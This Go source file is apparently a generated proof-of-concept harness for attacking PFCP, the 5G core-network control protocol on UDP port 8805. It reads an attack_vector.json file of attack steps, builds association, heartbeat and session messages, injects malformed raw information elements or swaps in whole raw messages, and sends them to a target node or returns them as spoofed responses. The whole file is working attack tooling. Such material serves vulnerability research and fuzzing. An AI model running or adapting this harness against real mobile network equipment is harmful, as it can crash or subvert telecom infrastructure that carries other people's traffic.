package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

const PFCPPort = 8805

// Filled by the PoC generator. If empty, the runtime skips equivalence checking.
const ExpectedAttackVectorSHA256 = ""

type AttackVectorDocument struct {
	CandidateID string `json:"candidate_id"`
	AttackVector struct {
		AttackSequence []AttackStep `json:"attack_sequence"`
	} `json:"attack_vector"`
	ProtocolMessages map[string]ProtocolMessageSpec `json:"protocol_messages"`
}

type AttackStep struct {
	Step     int    `json:"step"`
	Message  string `json:"message"`
	Triggers bool   `json:"triggers_vulnerability"`
	Action   string `json:"action"`
	Manipulation struct {
		IE            string `json:"ie"`
		Field         string `json:"field"`
		MaliciousValue any   `json:"malicious_value"`
		RawHex        string `json:"raw_hex"`
		RawHexKind    string `json:"raw_hex_kind"`
	} `json:"manipulation"`
}

type ProtocolMessageSpec struct {
	Header     map[string]any `json:"header"`
	IEs        map[string]any `json:"ies"`
	RawHex     string         `json:"raw_hex"`
	RawHexKind string         `json:"raw_hex_kind"`
}

var (
	targetAddr string
	listenAddr string
	localAddr  string
	seid       uint64
	timeout    int
)

func init() {
	flag.StringVar(&targetAddr, "target", "", "Target PFCP IP address (client mode)")
	flag.StringVar(&listenAddr, "listen", "", "Listen address (server mode)")
	flag.StringVar(&localAddr, "local", "0.0.0.0", "Local IP address for PFCP")
	flag.Uint64Var(&seid, "seid", 1, "SEID for the PFCP session")
	flag.IntVar(&timeout, "timeout", 5, "Response timeout in seconds")
}

func decodeHex(raw string) ([]byte, error) {
	raw = strings.ReplaceAll(raw, " ", "")
	raw = strings.ReplaceAll(raw, "\n", "")
	raw = strings.ReplaceAll(raw, "0x", "")
	if raw == "" {
		return nil, nil
	}
	return hex.DecodeString(raw)
}

func injectRawIE(msg []byte, rawHex string) ([]byte, error) {
	rawIE, err := decodeHex(rawHex)
	if err != nil {
		return nil, err
	}
	if len(rawIE) == 0 {
		return msg, nil
	}
	if len(msg) < 4 {
		return nil, fmt.Errorf("PFCP message too short")
	}
	currentLen := binary.BigEndian.Uint16(msg[2:4])
	newLen := currentLen + uint16(len(rawIE))
	binary.BigEndian.PutUint16(msg[2:4], newLen)
	return append(msg, rawIE...), nil
}

func loadAttackVector() (*AttackVectorDocument, error) {
	raw, err := os.ReadFile("attack_vector.json")
	if err != nil {
		return nil, err
	}
	if ExpectedAttackVectorSHA256 != "" {
		sum := sha256.Sum256(raw)
		got := fmt.Sprintf("%x", sum)
		if got != ExpectedAttackVectorSHA256 {
			return nil, fmt.Errorf(
				"attack_vector.json SHA256 mismatch: expected=%s got=%s",
				ExpectedAttackVectorSHA256,
				got,
			)
		}
	}
	var doc AttackVectorDocument
	if err := json.Unmarshal(raw, &doc); err != nil {
		return nil, err
	}
	return &doc, nil
}

func sortSteps(steps []AttackStep) {
	sort.Slice(steps, func(i, j int) bool {
		return steps[i].Step < steps[j].Step
	})
}

func buildPFCPMessage(name string, seq uint32, seid uint64, localIP net.IP) ([]byte, error) {
	switch name {
	case "PFCP_Association_Setup_Request":
		msg := message.NewAssociationSetupRequest(
			seq,
			ie.NewNodeIDHeuristic(localIP.String()),
			ie.NewRecoveryTimeStamp(time.Now()),
		)
		return msg.Marshal()
	case "PFCP_Association_Setup_Response":
		msg := message.NewAssociationSetupResponse(
			seq,
			ie.NewCause(ie.CauseRequestAccepted),
			ie.NewNodeIDHeuristic(localIP.String()),
			ie.NewRecoveryTimeStamp(time.Now()),
		)
		return msg.Marshal()
	case "PFCP_Heartbeat_Request":
		msg := message.NewHeartbeatRequest(
			seq,
			ie.NewRecoveryTimeStamp(time.Now()),
			nil,
		)
		return msg.Marshal()
	case "PFCP_Heartbeat_Response":
		msg := message.NewHeartbeatResponse(
			seq,
			ie.NewRecoveryTimeStamp(time.Now()),
		)
		return msg.Marshal()
	case "PFCP_Session_Establishment_Request":
		msg := message.NewSessionEstablishmentRequest(
			0,
			0,
			seid,
			seq,
			0,
			ie.NewNodeIDHeuristic(localIP.String()),
			ie.NewFSEID(seid, localIP, nil),
			ie.NewCreateFAR(
				ie.NewFARID(1),
				ie.NewApplyAction(0x02),
				ie.NewForwardingParameters(
					ie.NewDestinationInterface(ie.DstInterfaceAccess),
				),
			),
		)
		return msg.Marshal()
	case "PFCP_Session_Establishment_Response":
		msg := message.NewSessionEstablishmentResponse(
			0,
			0,
			seid,
			seq,
			ie.NewCause(ie.CauseRequestAccepted),
		)
		return msg.Marshal()
	default:
		return nil, fmt.Errorf("no builder for message: %s", name)
	}
}

func resolveRawHex(step AttackStep, spec *ProtocolMessageSpec) string {
	if step.Manipulation.RawHex != "" {
		return step.Manipulation.RawHex
	}
	if spec != nil && spec.RawHex != "" {
		return spec.RawHex
	}
	return ""
}

func resolveRawKind(step AttackStep, spec *ProtocolMessageSpec) string {
	if step.Manipulation.RawHexKind != "" {
		return step.Manipulation.RawHexKind
	}
	if spec != nil && spec.RawHexKind != "" {
		return spec.RawHexKind
	}
	return "ie"
}

func responseTargetFor(step AttackStep) (string, bool) {
	if step.Action == "respond" || strings.Contains(step.Message, "Response") {
		return strings.Replace(step.Message, "Response", "Request", 1), true
	}
	return "", false
}

func getSeqNum(buf []byte) uint32 {
	if len(buf) < 16 {
		return 0
	}
	if buf[0]&0x01 != 0 {
		return uint32(buf[12])<<16 | uint32(buf[13])<<8 | uint32(buf[14])
	}
	return uint32(buf[4])<<16 | uint32(buf[5])<<8 | uint32(buf[6])
}

func extractSEID(buf []byte, fallback uint64) uint64 {
	if len(buf) < 12 {
		return fallback
	}
	if buf[0]&0x01 != 0 {
		seen := binary.BigEndian.Uint64(buf[4:12])
		if seen != 0 {
			return seen
		}
	}
	return fallback
}

func messageNameToType(name string) (uint8, bool) {
	switch name {
	case "PFCP_Association_Setup_Request":
		return message.MsgTypeAssociationSetupRequest, true
	case "PFCP_Association_Setup_Response":
		return message.MsgTypeAssociationSetupResponse, true
	case "PFCP_Heartbeat_Request":
		return message.MsgTypeHeartbeatRequest, true
	case "PFCP_Heartbeat_Response":
		return message.MsgTypeHeartbeatResponse, true
	case "PFCP_Session_Establishment_Request":
		return message.MsgTypeSessionEstablishmentRequest, true
	default:
		return 0, false
	}
}

func main() {
	flag.Parse()

	doc, err := loadAttackVector()
	if err != nil {
		log.Fatalf("[-] Failed to load attack_vector.json: %v", err)
	}
	sortSteps(doc.AttackVector.AttackSequence)

	serverMode := listenAddr != ""
	connected := false

	var conn *net.UDPConn
	if serverMode {
		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", listenAddr, PFCPPort))
		if err != nil {
			log.Fatalf("[-] Failed to resolve listen address: %v", err)
		}
		conn, err = net.ListenUDP("udp", addr)
		if err != nil {
			log.Fatalf("[-] Failed to listen: %v", err)
		}
		defer conn.Close()
		log.Printf("[+] Listening on %s:%d", listenAddr, PFCPPort)
	} else {
		if targetAddr == "" {
			log.Fatalf("[-] Client mode requires -target")
		}
		raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetAddr, PFCPPort))
		if err != nil {
			log.Fatalf("[-] Failed to resolve target: %v", err)
		}
		laddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:0", localAddr))
		if err != nil {
			log.Fatalf("[-] Failed to resolve local: %v", err)
		}
		conn, err = net.DialUDP("udp", laddr, raddr)
		if err != nil {
			log.Fatalf("[-] Failed to connect: %v", err)
		}
		connected = true
		defer conn.Close()
		log.Printf("[+] Connected to target from %s", conn.LocalAddr().String())
	}

	var remoteTarget *net.UDPAddr
	if targetAddr != "" {
		remoteTarget, _ = net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetAddr, PFCPPort))
	}

	localIP := conn.LocalAddr().(*net.UDPAddr).IP
	if localIP.IsUnspecified() {
		localIP = net.ParseIP("127.0.0.1")
	}

	seq := uint32(1)
	buf := make([]byte, 4096)

	for _, step := range doc.AttackVector.AttackSequence {
		action := step.Action
		if action == "" {
			if strings.Contains(step.Message, "Response") {
				action = "respond"
			} else {
				action = "send"
			}
		}

		if action == "respond" {
			if !serverMode {
				log.Fatalf("[-] Respond step requires -listen: %s", step.Message)
			}
			targetReq, ok := responseTargetFor(step)
			if !ok {
				log.Printf("[!] Cannot resolve request for response %s", step.Message)
				continue
			}
			expectedType, _ := messageNameToType(targetReq)
			deadline := time.Now().Add(time.Duration(timeout) * time.Second)
			for {
				conn.SetReadDeadline(deadline)
				n, remoteAddr, err := conn.ReadFromUDP(buf)
				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						log.Printf("[!] Timeout waiting for %s", targetReq)
						break
					}
					log.Printf("[!] Read error: %v", err)
					continue
				}
				if n < 4 {
					continue
				}
				msgType := buf[1]
				if expectedType != 0 && msgType != expectedType {
					continue
				}

				log.Printf("[*] Responding with %s for %s", step.Message, targetReq)
				spec, _ := doc.ProtocolMessages[step.Message]
				respSeq := getSeqNum(buf[:n])
				respSEID := extractSEID(buf[:n], seid)
				msgBytes, err := buildPFCPMessage(step.Message, respSeq, respSEID, localIP)
				rawHex := resolveRawHex(step, &spec)
				rawKind := resolveRawKind(step, &spec)
				if rawKind == "message" && rawHex != "" {
					raw, err := decodeHex(rawHex)
					if err == nil && len(raw) > 0 {
						msgBytes = raw
					}
				} else if err == nil && rawHex != "" {
					finalMsg, err := injectRawIE(msgBytes, rawHex)
					if err == nil {
						msgBytes = finalMsg
					}
				}

				if msgBytes == nil {
					log.Printf("[!] Unable to build response for %s", step.Message)
					break
				}
				if _, err := conn.WriteToUDP(msgBytes, remoteAddr); err != nil {
					log.Printf("[!] Failed to send response: %v", err)
				} else {
					log.Printf("[+] Sent %s (%d bytes)", step.Message, len(msgBytes))
				}
				seq++
				break
			}
			continue
		}

		if remoteTarget == nil {
			log.Fatalf("[-] Send step requires -target: %s", step.Message)
		}

		log.Printf("[*] Step %d: Sending %s", step.Step, step.Message)
		spec, _ := doc.ProtocolMessages[step.Message]
		msgBytes, err := buildPFCPMessage(step.Message, seq, seid, localIP)
		if err != nil {
			log.Printf("[!] Builder error for %s: %v", step.Message, err)
			if spec.RawHex == "" && step.Manipulation.RawHex == "" {
				continue
			}
			raw, err := decodeHex(resolveRawHex(step, &spec))
			if err != nil {
				log.Printf("[!] Failed to decode raw hex for %s: %v", step.Message, err)
				continue
			}
			msgBytes = raw
		}

		rawHex := resolveRawHex(step, &spec)
		rawKind := resolveRawKind(step, &spec)
		if rawKind == "message" && rawHex != "" {
			raw, err := decodeHex(rawHex)
			if err == nil && len(raw) > 0 {
				msgBytes = raw
			}
		} else if rawHex != "" {
			finalMsg, err := injectRawIE(msgBytes, rawHex)
			if err == nil {
				msgBytes = finalMsg
			}
		}

		if connected {
			if _, err := conn.Write(msgBytes); err != nil {
				log.Fatalf("[-] Failed to send %s: %v", step.Message, err)
			}
		} else {
			if _, err := conn.WriteToUDP(msgBytes, remoteTarget); err != nil {
				log.Fatalf("[-] Failed to send %s: %v", step.Message, err)
			}
		}
		log.Printf("[+] Sent %s (%d bytes)", step.Message, len(msgBytes))

		conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
		if _, err := conn.ReadFromUDP(buf); err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Printf("[!] Timeout waiting for response")
			} else {
				log.Printf("[!] Read error: %v", err)
			}
		}
		seq++
	}

	log.Printf("[*] PoC execution completed")
}
